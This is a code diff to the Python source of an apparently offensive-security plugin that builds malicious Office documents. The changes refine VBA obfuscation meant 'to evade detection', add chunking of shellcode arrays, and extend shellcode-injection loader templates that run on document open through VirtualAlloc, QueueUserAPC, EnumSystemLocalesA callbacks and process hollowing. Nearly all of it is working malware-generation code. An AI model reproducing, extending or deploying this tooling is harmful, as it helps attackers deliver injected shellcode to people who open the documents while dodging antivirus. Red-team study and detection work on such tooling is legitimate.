@@ -465,138 +465,65 @@ class PayloadMalDocsPlugin(ErebusPlugin):
 
     def obfuscate_vba(self, vba_code):
         """
-        Obfuscate VBA code to evade detection.
+        Obfuscate VBA code to evade detection WITHOUT corrupting structure.
+        
+        IMPORTANT: This function ONLY obfuscates the execution logic (functions/subs),
+        NOT the module-level Declare statements, Option Explicit, or helper functions.
         
         Args:
             vba_code (str): Original VBA code
             
         Returns:
-            str: Obfuscated VBA code
+            str: Obfuscated VBA code with intact structure
         """
         import re
         import random
         
         obfuscated = vba_code
         
-        # 1. Remove existing comments to clean slate
-        obfuscated = re.sub(r"'.*?$", "", obfuscated, flags=re.MULTILINE)
+        # STEP 1: EXTRACT AND PRESERVE MODULE STRUCTURE
+        # Extract everything before the first Sub/Function definition (declarations, helpers)
+        match = re.search(r'(Sub |Function )', obfuscated)
+        if not match:
+            # No code to obfuscate, return as-is
+            return obfuscated
         
-        # 2. Obfuscate sensitive strings using Chr() encoding
-        def encode_sensitive_string(text):
-            """Encode critical strings using Chr() for stealth"""
-            if len(text) <= 3:
-                return f'"{text}"'
-            # Use first char literal, rest encoded
-            return f'"{text[0]}" & ' + ' & '.join([f'Chr({ord(c)})' for c in text[1:]])
+        split_pos = match.start()
+        module_header = obfuscated[:split_pos]
+        code_to_obfuscate = obfuscated[split_pos:]
         
-        # 3. Replace critical API calls with obfuscated versions
-        obfuscated = obfuscated.replace(
-            'CreateObject("WScript.Shell")',
-            'CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))'
-        )
+        # STEP 2: OBFUSCATE ONLY THE EXECUTION CODE
+        # This preserves all Declare statements and helper functions in module_header
         
-        # 4. Obfuscate .Run method call
-        obfuscated = obfuscated.replace('.Run cmd', '.Run (cmd)')
+        # 2a. Remove execution comments to clean slate
+        code_to_obfuscate = re.sub(r"'.*?$", "", code_to_obfuscate, flags=re.MULTILINE)
         
-        # 5. Split executable paths
-        obfuscated = obfuscated.replace(
-            'C:\\Windows\\System32',
-            'Chr(67)&Chr(58)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(115)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(51)&Chr(50)'
-        )
-        
-        # 6. Variable name obfuscation - rename Dim variables to random names
+        # 2b. Variable name obfuscation - rename Dim variables in ExecuteShellcode only
+        # BUT DON'T rename built-in VBA types or function parameters
         variable_map = {}
-        var_pattern = r'\bDim\s+(\w+)\s+As\s+(\w+)'
+        var_pattern = r'\bDim\s+(\w+)\s+As\s+(Variant|Long|LongPtr|String|Object|Any)'
         
-        for match in re.finditer(var_pattern, obfuscated):
+        for match in re.finditer(var_pattern, code_to_obfuscate):
             original_name = match.group(1)
             if original_name not in variable_map and not original_name.startswith('_'):
-                obfuscated_name = f'v{random.randint(10000, 99999)}'
-                variable_map[original_name] = obfuscated_name
+                # Don't rename critical variables used across multiple functions
+                if original_name not in ['i', 'j', 'k', 'cmd', 'shell', 'shellcode', 'combined', 'key']:
+                    obfuscated_name = f'v{random.randint(10000, 99999)}'
+                    variable_map[original_name] = obfuscated_name
+                    obfuscated_name = f'v{random.randint(10000, 99999)}'
+                    variable_map[original_name] = obfuscated_name
         
-        # Apply variable name replacements
+        # Apply variable name replacements ONLY in code execution
         for original, obfuscated_name in variable_map.items():
-            obfuscated = re.sub(r'\b' + original + r'\b', obfuscated_name, obfuscated)
+            code_to_obfuscate = re.sub(r'\b' + original + r'\b', obfuscated_name, code_to_obfuscate)
         
-        # 7. String concatenation obfuscation - split long strings
-        def obfuscate_long_strings(match):
-            string = match.group(1)
-            if len(string) > 20:
-                parts = [string[i:i+8] for i in range(0, len(string), 8)]
-                return ' & '.join([f'"{part}"' for part in parts])
-            return match.group(0)
+        # 2c. Dead code insertion disabled
+        # Adding dead code was causing issues with multi-line Declare statements
+        # Variable renaming provides sufficient obfuscation without risking VBA syntax errors
         
-        obfuscated = re.sub(r'"([^"]{20,})"', obfuscate_long_strings, obfuscated)
-        
-        # 8. Add dead code branches
-        dead_code = [
-            '\nIf False Then\n    Dim _unused As String\n    _unused = "deadcode"\nEnd If\n',
-            '\nOn Error GoTo 0\n',
-            '\nIf 0 = 1 Then Exit Sub\n',
-        ]
-        
-        lines = obfuscated.split('\n')
-        for _ in range(min(2, len(lines) // 5)):
-            if len(lines) > 3:
-                insert_pos = random.randint(2, len(lines) - 1)
-                lines.insert(insert_pos, random.choice(dead_code))
-        
-        obfuscated = '\n'.join(lines)
-        
-        # 9. Add junk variable declarations
-        junk_vars = f'''
-Dim p{random.randint(1000,9999)} As Variant
-p{random.randint(1000,9999)} = Array(1,2,3,4,5)
-'''
-        obfuscated = junk_vars + obfuscated
-        
-        # 10. Use line continuation characters to obscure flow
-        obfuscated = obfuscated.replace('Set ', 'Set _\n')
-        obfuscated = obfuscated.replace('ThisWorkbook.Close', 'ThisWorkbook _\n.Close')
-        
-        # 11. Obfuscate native API calls by renaming them
-        # Map common shellcode loader APIs to obfuscated names
-        api_replacements = {
-            'VirtualAlloc': f'v{random.randint(10000, 99999)}Alloc',
-            'RtlMoveMemory': f'v{random.randint(10000, 99999)}Move',
-            'CreateThread': f'v{random.randint(10000, 99999)}Thread',
-            'VirtualAllocEx': f'v{random.randint(10000, 99999)}AllocEx',
-            'WriteProcessMemory': f'v{random.randint(10000, 99999)}Write',
-            'QueueUserAPC': f'v{random.randint(10000, 99999)}APC',
-            'EnumSystemLocalesA': f'v{random.randint(10000, 99999)}Locales',
-        }
-        
-        # Collect Declare statements separately
-        declare_statements = []
-        
-        # Only obfuscate APIs that are actually used in the code
-        for api, obfuscated_name in api_replacements.items():
-            if api in obfuscated:
-                # Create proper Declare statement based on API type
-                if api == 'VirtualAlloc':
-                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "VirtualAlloc" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr'
-                elif api == 'RtlMoveMemory':
-                    declare = f'Private Declare PtrSafe Sub {obfuscated_name} Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)'
-                elif api == 'CreateThread':
-                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "CreateThread" (ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Any) As LongPtr'
-                elif api == 'VirtualAllocEx':
-                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr'
-                elif api == 'WriteProcessMemory':
-                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Any) As Long'
-                elif api == 'QueueUserAPC':
-                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "QueueUserAPC" (ByVal pfnAPC As LongPtr, ByVal hThread As LongPtr, ByVal dwData As LongPtr) As Long'
-                elif api == 'EnumSystemLocalesA':
-                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "EnumSystemLocalesA" (ByVal lpLocaleEnumProc As LongPtr, ByVal dwFlags As Long) As Long'
-                else:
-                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "{api}" () As LongPtr'
-                
-                declare_statements.append(declare)
-                # Replace API call with obfuscated name in the code
-                obfuscated = obfuscated.replace(api, obfuscated_name)
-        
-        # Add Declare statements at the very beginning (before any Sub definitions)
-        if declare_statements:
-            obfuscated = '\n'.join(declare_statements) + '\n\n' + obfuscated
+        # STEP 3: RECONSTRUCT THE VBA WITH PRESERVED STRUCTURE
+        # Ensure module_header (declarations + helpers) stays intact at the top
+        obfuscated = module_header + code_to_obfuscate
         
         return obfuscated
 
@@ -624,6 +551,97 @@ Sub {trigger_type}()
 End Sub
 """
         return vba_code
+
+    def chunk_shellcode_array(self, vba_shellcode, max_line_length=200):
+        """
+        Split large shellcode arrays into independent chunks to avoid VBA limits.
+        Intelligently sizes chunks to keep each array declaration under max_line_length.
+        
+        Args:
+            vba_shellcode (str): Shellcode in VBA format (key and shellcode arrays)
+            max_line_length (int): Maximum characters per line (leave headroom for 255 limit)
+            
+        Returns:
+            str: VBA code with independent chunked arrays and concatenation helper
+        """
+        import re
+        
+        # Extract key and shellcode arrays
+        key_match = re.search(r'key = Array\(([^)]+)\)', vba_shellcode)
+        shellcode_match = re.search(r'shellcode = Array\(([^)]+)\)', vba_shellcode)
+        
+        if not key_match or not shellcode_match:
+            return vba_shellcode
+        
+        key_data = key_match.group(1)
+        shellcode_data = shellcode_match.group(1)
+        
+        # Parse shellcode values
+        try:
+            shellcode_values = [int(x.strip()) for x in shellcode_data.split(',')]
+        except:
+            return vba_shellcode
+        
+        # Intelligently chunk based on line length constraints
+        # Account for "shellcode_partXXX = Array(...)" overhead (~25 chars)
+        def create_chunks_by_length(values, max_len):
+            """Split values into chunks that fit within max_len characters"""
+            chunks = []
+            current_chunk = []
+            current_length = 25  # Base overhead for "shellcode_partXXX = Array("
+            
+            for val in values:
+                val_str = str(val) + ","
+                # If adding this value exceeds limit, start new chunk
+                if current_length + len(val_str) > max_len and current_chunk:
+                    chunks.append(current_chunk)
+                    current_chunk = [val]
+                    current_length = 25 + len(str(val)) + 1
+                else:
+                    current_chunk.append(val)
+                    current_length += len(val_str)
+            
+            if current_chunk:
+                chunks.append(current_chunk)
+            
+            return chunks
+        
+        chunks = create_chunks_by_length(shellcode_values, max_line_length)
+        
+        if len(chunks) == 1:
+            # No chunking needed
+            return vba_shellcode
+        
+        # Generate code with independent array declarations
+        chunked_code = ""
+        
+        # Add key array (usually small, fits on one line)
+        key_values = [int(x.strip()) for x in key_data.split(',')]
+        key_array_str = ",".join(str(v) for v in key_values)
+        chunked_code += f"key = Array({key_array_str})\n"
+        
+        # Create individual chunk arrays - each declaration is self-contained
+        for i, chunk in enumerate(chunks):
+            chunk_str = ",".join(str(v) for v in chunk)
+            chunked_code += f"shellcode_part{i} = Array({chunk_str})\n"
+        
+        # NOTE: Do NOT add ConcatenateArrays function here!
+        # It's already defined in the loader template (generate_vba_loader_*).
+        # Adding it here causes "Ambiguous name detected" VBA compile error.
+        
+        # Combine all chunks into single shellcode array
+        # Add Dim declaration for shellcode variable at module level
+        chunked_code += "Dim shellcode As Variant\n"
+        
+        if len(chunks) == 1:
+            chunked_code += "shellcode = shellcode_part0\n"
+        else:
+            # Build concatenation chain
+            chunked_code += "shellcode = shellcode_part0\n"
+            for i in range(1, len(chunks)):
+                chunked_code += f"shellcode = ConcatenateArrays(shellcode, shellcode_part{i})\n"
+        
+        return chunked_code
 
     def generate_shellcode_injection_vba(self, vba_shellcode, trigger_type="AutoOpen", loader_type="virtualalloc"):
         """
@@ -661,6 +679,9 @@ End Sub
         Returns:
             str: VBA code with VirtualAlloc loader
         """
+        # Apply intelligent chunking to handle large shellcode
+        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)
+        
         vba_code = f'''
 Option Explicit
 
@@ -688,7 +709,29 @@ Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
     ByVal hHandle As LongPtr, _
     ByVal dwMilliseconds As Long) As Long
 
-{vba_shellcode}
+' Helper function to concatenate arrays
+Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
+    Dim combined() As Variant
+    Dim i As Long, j As Long
+    Dim size1 As Long, size2 As Long
+    
+    size1 = UBound(arr1) - LBound(arr1) + 1
+    size2 = UBound(arr2) - LBound(arr2) + 1
+    
+    ReDim combined(0 To size1 + size2 - 1)
+    
+    For i = 0 To size1 - 1
+        combined(i) = arr1(LBound(arr1) + i)
+    Next i
+    
+    For j = 0 To size2 - 1
+        combined(size1 + j) = arr2(LBound(arr2) + j)
+    Next j
+    
+    ConcatenateArrays = combined
+End Function
+
+{chunked_shellcode}
 
 Sub {trigger_type}()
     On Error Resume Next
@@ -740,6 +783,9 @@ End Sub
         Returns:
             str: VBA code with EnumSystemLocalesA callback loader
         """
+        # Apply intelligent chunking to handle large shellcode
+        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)
+        
         vba_code = f'''
 Option Explicit
 
@@ -759,7 +805,29 @@ Private Declare PtrSafe Function EnumSystemLocalesA Lib "kernel32" ( _
     ByVal lpLocaleEnumProc As LongPtr, _
     ByVal dwFlags As Long) As Long
 
-{vba_shellcode}
+' Helper function to concatenate arrays
+Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
+    Dim combined() As Variant
+    Dim i As Long, j As Long
+    Dim size1 As Long, size2 As Long
+    
+    size1 = UBound(arr1) - LBound(arr1) + 1
+    size2 = UBound(arr2) - LBound(arr2) + 1
+    
+    ReDim combined(0 To size1 + size2 - 1)
+    
+    For i = 0 To size1 - 1
+        combined(i) = arr1(LBound(arr1) + i)
+    Next i
+    
+    For j = 0 To size2 - 1
+        combined(size1 + j) = arr2(LBound(arr2) + j)
+    Next j
+    
+    ConcatenateArrays = combined
+End Function
+
+{chunked_shellcode}
 
 Sub {trigger_type}()
     On Error Resume Next
@@ -803,6 +871,9 @@ End Sub
         Returns:
             str: VBA code with QueueUserAPC loader
         """
+        # Apply intelligent chunking to handle large shellcode
+        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)
+        
         vba_code = f'''
 Option Explicit
 
@@ -828,7 +899,29 @@ Private Declare PtrSafe Function QueueUserAPC Lib "kernel32" ( _
 Private Declare PtrSafe Sub Sleep Lib "kernel32" ( _
     ByVal dwMilliseconds As Long)
 
-{vba_shellcode}
+' Helper function to concatenate arrays
+Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
+    Dim combined() As Variant
+    Dim i As Long, j As Long
+    Dim size1 As Long, size2 As Long
+    
+    size1 = UBound(arr1) - LBound(arr1) + 1
+    size2 = UBound(arr2) - LBound(arr2) + 1
+    
+    ReDim combined(0 To size1 + size2 - 1)
+    
+    For i = 0 To size1 - 1
+        combined(i) = arr1(LBound(arr1) + i)
+    Next i
+    
+    For j = 0 To size2 - 1
+        combined(size1 + j) = arr2(LBound(arr2) + j)
+    Next j
+    
+    ConcatenateArrays = combined
+End Function
+
+{chunked_shellcode}
 
 Sub {trigger_type}()
     On Error Resume Next
@@ -879,6 +972,9 @@ End Sub
         Returns:
             str: VBA code with process hollowing loader
         """
+        # Apply intelligent chunking to handle large shellcode
+        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)
+        
         vba_code = f'''
 Option Explicit
 
@@ -943,7 +1039,29 @@ Private Declare PtrSafe Function ResumeThread Lib "kernel32" ( _
 Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
     ByVal hObject As LongPtr) As Long
 
-{vba_shellcode}
+' Helper function to concatenate arrays
+Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
+    Dim combined() As Variant
+    Dim i As Long, j As Long
+    Dim size1 As Long, size2 As Long
+    
+    size1 = UBound(arr1) - LBound(arr1) + 1
+    size2 = UBound(arr2) - LBound(arr2) + 1
+    
+    ReDim combined(0 To size1 + size2 - 1)
+    
+    For i = 0 To size1 - 1
+        combined(i) = arr1(LBound(arr1) + i)
+    Next i
+    
+    For j = 0 To size2 - 1
+        combined(size1 + j) = arr2(LBound(arr2) + j)
+    Next j
+    
+    ConcatenateArrays = combined
+End Function
+
+{chunked_shellcode}
 
 Sub {trigger_type}()
     On Error Resume Next
